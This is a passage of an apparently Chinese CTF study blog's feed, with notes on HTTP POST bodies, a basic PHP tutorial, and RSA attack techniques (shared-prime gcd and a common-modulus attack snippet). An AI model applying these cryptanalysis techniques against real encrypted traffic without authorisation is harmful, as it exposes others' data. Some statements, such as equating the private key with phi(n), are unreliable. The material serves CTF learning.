&lt;p&gt;则改 GET /login HTTP/1.1 为 POST /login HTTP/1.1&lt;/p&gt;
&lt;p&gt;并加上 Content-Type: application/&lt;strong&gt;x-www-form-urlencoded&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;若是发送 JSON 格式，则改为 Content-Type: application/json&lt;/p&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;p&gt;&amp;quot;username&amp;quot;: &amp;quot;your_username&amp;quot;,&lt;/p&gt;
&lt;p&gt;&amp;quot;password&amp;quot;: &amp;quot;your_password&amp;quot;&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;p&gt;注意键值双引号&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Content-Type&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;application/x-www-form-urlencoded&lt;/td&gt;
&lt;td&gt;和 GET 查询字段的写法一样，开头不需要  &lt;code&gt;?&lt;/code&gt; ，用  &lt;code&gt;&amp;amp;&lt;/code&gt;  符号连接各查询参数，遇到特殊字符需要进行转义。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;application/json&lt;/td&gt;
&lt;td&gt;Body 给出一个 JSON 格式的数据，服务端会解析它。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;multipart/form-data&lt;/td&gt;
&lt;td&gt;表单字段，一般用于有文件等复杂类型的场景。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://ly1tnt.github.io/2025/01/06/CTF/Crypto/Crypto/</guid>
            <title>Crypto</title>
            <link>https://ly1tnt.github.io/2025/01/06/CTF/Crypto/Crypto/</link>
            <category term="CTF" scheme="https://ly1tnt.github.io/categories/CTF/" />
            <category term="Crypto" scheme="https://ly1tnt.github.io/categories/CTF/Crypto/" />
            <pubDate>Mon, 06 Jan 2025 20:18:48 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;crypto&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#crypto&#34;&gt;#&lt;/a&gt; Crypto&lt;/h1&gt;
&lt;h3 id=&#34;1crypto常见库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1crypto常见库&#34;&gt;#&lt;/a&gt; 1.Crypto 常见库&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;gmpy2&lt;/code&gt; ：一个用于高效数值计算的库，特别适用于大整数的运算&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Crypto.Util.number&lt;/code&gt; ：提供了生成大素数和处理大整数的功能&lt;/p&gt;
&lt;h3 id=&#34;2getprime函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2getprime函数&#34;&gt;#&lt;/a&gt; 2.getPrime 函数&lt;/h3&gt;
&lt;p&gt;getPrime 函数用于生成 n 位的随机素数，其中 n 位指的是这个数二进制中包含 n 个二进制位，在保存时以十进制 (长整形) 存储。&lt;/p&gt;
&lt;h3 id=&#34;3powmod函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3powmod函数&#34;&gt;#&lt;/a&gt; 3.powmod 函数&lt;/h3&gt;
&lt;p&gt;powmod (m,e,n) 计算 m 的 e 次幂并对 n 取模，这是 RSA 加密核心计算，常见于 RSA 加密中。&lt;/p&gt;
&lt;h3 id=&#34;4rsa&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4rsa&#34;&gt;#&lt;/a&gt; 4.RSA&lt;/h3&gt;
&lt;p&gt;RSA 模数 n，密文 c，公钥指数 e，&lt;/p&gt;
&lt;p&gt;私钥 d 为 ϕ(n)=(p−1)(q−1)，这一步通常需要使用 yafu,yafu-x64 factor (n) 分解&lt;/p&gt;
&lt;p&gt;d=e−1 次方 modϕ(n) d=inverse (e)&lt;/p&gt;
&lt;p&gt;得到私钥后，可以以哦那个来解密密文 c:&lt;/p&gt;
&lt;p&gt;m=c 的 d 次方 mod n&lt;/p&gt;
&lt;h5 id=&#34;nextprimen&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nextprimen&#34;&gt;#&lt;/a&gt; nextprime(n):&lt;/h5&gt;
&lt;p&gt;寻找一个比 n 稍大的下一个素数&lt;/p&gt;
&lt;h5 id=&#34;gmpy2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gmpy2&#34;&gt;#&lt;/a&gt; gmpy2:&lt;/h5&gt;
&lt;p&gt;是一个高精度数学库&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;gmpy2.iroot(n,2)&lt;/strong&gt;: 计算 n 的平方根并返回一个元组 (root (计算后的值),is_exact (布尔值))&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;gmpy2.gcdext&lt;/strong&gt;: 返回一个元组，第一个值为最大公因数，第二个值为贝祖等式的系数 x, 第三个值为贝祖等式的系数 y。&lt;/p&gt;
&lt;h5 id=&#34;共享素数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#共享素数&#34;&gt;#&lt;/a&gt; 共享素数:&lt;/h5&gt;
&lt;p&gt;RSA 加密时进行了两次加密，并且给出了加密钥 e, 两次加密的 n1 和 n2, 密文 c, 分别使用 n1 和 n2，这个时候就可以看看两个 n 之间是否存在共用的素数。q=gmpy2.gcd (n1,n2)&lt;/p&gt;
&lt;h5 id=&#34;共模攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#共模攻击&#34;&gt;#&lt;/a&gt; 共模攻击：&lt;/h5&gt;
&lt;p&gt;当 e1，e2 互质时，gcd (e1,e2)=1, 那么一定存在整数 x,y 使得 gcd (a,b)=ax+by,&lt;/p&gt;
&lt;p&gt;所以得到 e1 * s1+e2 * s2=1&lt;/p&gt;
&lt;p&gt;因为 e1 和 e2 为正整数，所以 s1、s2 皆为整数，其中一个为正一个为负&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;推导过程&lt;/strong&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;这里需要用到两条幂运算的性质：

(a * b) % p = (a % p * b % p) % p
a ^ b % p = ((a % p) ^ b) % p

因为c1 = m^e1%n，c2 = m^e2%n，需要证明m=(c1^s1*c2^s2)%n

代入可得：

(c1^s1*c2^s2)%n = ((m^e1%n)^s1(m^e2%n)^s2)%n

                             =((m^e1%n)^s1*(m^e2%n)^s2)%n

                             =((m^e1)^s1%n*(m^e2)^s2%n)%n   //消掉%n

                             =((m^e1)^s1*(m^e2)^s2)%n

                             =((m^(e1*s1)*(m^(e2*s2))%n   //幂的乘方，底数不变，指数相乘

                             =(m^(e1*s1+e2*s2))%n   //同底数幂相乘，底数不变，指数相加

又因为m&amp;lt;n，所以(c1^s1*c2^s2)%n=m%n=m
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以 m 为 c1 的 t 次方 * c2 的 z 次方 mod n 不需要去求 phi&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; t &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 要求 c 的 s 次幂，就要先计算 c 的模反元素 c2r，然后求 c2r 的 - s2 次幂&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        t &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; t&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        c1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 求 c1 的逆元&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; z &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        z &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;z&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        c2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; gmpy2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;invert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    m &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; t&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; z&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; n  &lt;span class=&#34;token comment&#34;&gt;# (c1^s1*c2^s2)%n=m%n=m&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;之所以可以这样计算，是因为当在 mod n 的情况下，和 c1 互为逆元的数可以当作是 c1 的倒数，而一个数的负指数次方等于一个数指数次方分之一。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://ly1tnt.github.io/2024/11/15/CTF/Web/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
            <title>PHP学习笔记</title>
            <link>https://ly1tnt.github.io/2024/11/15/CTF/Web/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
            <category term="CTF" scheme="https://ly1tnt.github.io/categories/CTF/" />
            <category term="Web" scheme="https://ly1tnt.github.io/categories/CTF/Web/" />
            <pubDate>Fri, 15 Nov 2024 16:49:12 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;php学习笔记&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#php学习笔记&#34;&gt;#&lt;/a&gt; PHP 学习笔记&lt;/h1&gt;
&lt;h2 id=&#34;一-基本知识&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-基本知识&#34;&gt;#&lt;/a&gt; 一、基本知识&lt;/h2&gt;
&lt;h3 id=&#34;11函数知识&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#11函数知识&#34;&gt;#&lt;/a&gt; 1.1 函数知识&lt;/h3&gt;
&lt;p&gt;phpinfo: 这个函数会显示一个当前电脑 (服务器) 的详细 php 信息。&lt;/p&gt;
&lt;h3 id=&#34;12常量变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#12常量变量&#34;&gt;#&lt;/a&gt; 1.2 常量变量&lt;/h3&gt;
&lt;p&gt;PHP 变量以美元符 $ 开始。&lt;/p&gt;
&lt;p&gt;变量可分类为：可变变量，外部变量，环境变量&lt;/p&gt;
&lt;p&gt;可变变量 EX：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;&amp;lt;?php
// 服务器读取的  编码设置
    header(&#39;Content-type:text/html;charset=utf-8&#39;);
//定义了一个变量叫作$shu 将$shu这个变量的值设为字符串的biao
$shu = ‘biao’；
//定义了一个变量叫作$biao 将他的值设置为鼠标
$biao = ‘鼠标’；
//$$shu就是可变变量；在已声明的变量$shu前又加上了一个变量符
echo $$shu;
?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;外部变量 EX:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;&amp;lt;html&amp;gt;
  &amp;lt;head&amp;gt;
  &amp;lt;/head&amp;gt;
  &amp;lt;body&amp;gt;
&amp;lt;!-- 这一行method 对应的值改为post ---&amp;gt;
&amp;lt;form action=&amp;quot;req.php&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;username&amp;quot;/&amp;gt;
&amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;pwd&amp;quot;/&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;提交&amp;quot;/&amp;gt;
&amp;lt;/form&amp;gt;
  &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;PHP 代码调用&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;&amp;lt;?php
//$_POST[‘username’]，将username作为字符串放在中括号里面，就得到了表单里面的&amp;lt;input type=”text”name=”username”/&amp;gt;的值
$u = $_POST[&#39;username&#39;];
echo $u.&#39;&amp;lt;br /&amp;gt;&#39;;
//$_POST[‘pwd’]，将pwd作为字符串放在中括号里面，就得到了表单里面的&amp;lt;input type=”text”name=”pwd”/&amp;gt;的值
$passwd = $_POST[&#39;pwd&#39;];
echo $passwd.&#39;&amp;lt;br /&amp;gt;&#39;;
?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/285dc7d06730539f99a0c9c31ec7fd56.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;环境变量:&lt;/p&gt;
&lt;p&gt;$_SERVER&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/4f8f6205720abd0bd7767e16c6db4730.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;常量:&lt;/p&gt;
&lt;p&gt;代码中的定义:&lt;/p&gt;
&lt;p&gt;define (常量名，常量值)&lt;/p&gt;
&lt;p&gt;1、常量名可以小写，但是通常大写&lt;br /&gt;
 2、常量名可以不加引号，但是通常加上引号&lt;br /&gt;
 3、在字符串中调用常量的时候，必须在引号外面&lt;br /&gt;
 4、常量名建议只用字母和下划线&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php+HTML&#34;&gt;&amp;lt;?php
define(&#39;MY_NAME&#39;,&#39;PHP中文网&#39;);
echo MY_NAME;
//下面是错误的调用方式
echo &#39;我的名字是MY_NAME&#39;;
//下面是正确的调用方式
echo &#39;我的名字是&#39;.MY_NAME;
?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一些内置的常量&lt;/p&gt;
&lt;h3 id=&#34;13php数据类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#13php数据类型&#34;&gt;#&lt;/a&gt; 1.3php 数据类型&lt;/h3&gt;
&lt;h3 id=&#34;在这里插入图片描述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#在这里插入图片描述&#34;&gt;#&lt;/a&gt; &lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/2d220531e183e4b5ee7bcdcb219b7a99.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/h3&gt;
&lt;p&gt;2 种特殊的数据类型:&lt;/p&gt;
&lt;p&gt;resource（资源类型）与 null（无 / 空白类型）&lt;/p&gt;
&lt;h3 id=&#34;14查看数据类型和判断数据类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#14查看数据类型和判断数据类型&#34;&gt;#&lt;/a&gt; 1.4 查看数据类型和判断数据类型&lt;/h3&gt;
&lt;p&gt;查看数据类型：&lt;br /&gt;
1、gettype（传入一个变量）能获得变量的类型&lt;br /&gt;
 2、var_dump（传入一个变量）输出变量类型和&lt;strong&gt;值&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 声明一个变量 88.8, 可以自己多做几次实现换成其他类型看看 $type 输出是多少。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$float&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;88.8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$type&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;gettype&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$float&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 多换几个类型试试&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;你喜欢男人还是喜欢女人&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$type&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;判断数据类型&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/c6b3c0aea250a957614491288e8b1021.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;numeric: 数值&lt;/p&gt;
&lt;p&gt;callable: 函数&lt;/p&gt;
&lt;p&gt;scalar: 标量&lt;/p&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;15php三元运算符及其他运算符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#15php三元运算符及其他运算符&#34;&gt;#&lt;/a&gt; 1.5PHP 三元运算符及其他运算符&lt;/h3&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://i-blog.csdnimg.cn/blog_migrate/62c1cf6809c51789bdd42ef63d112533.png&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;16php流程控制语句&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#16php流程控制语句&#34;&gt;#&lt;/a&gt; 1.6PHP 流程控制语句&lt;/h3&gt;
&lt;p&gt;if switch while for 基本与 c 相同&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;do&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token comment&#34;&gt;// 代码框&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;判断&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;第&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;每周往返北京大连&amp;lt;br /&gt;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$i&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;goto&lt;/span&gt; end&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token 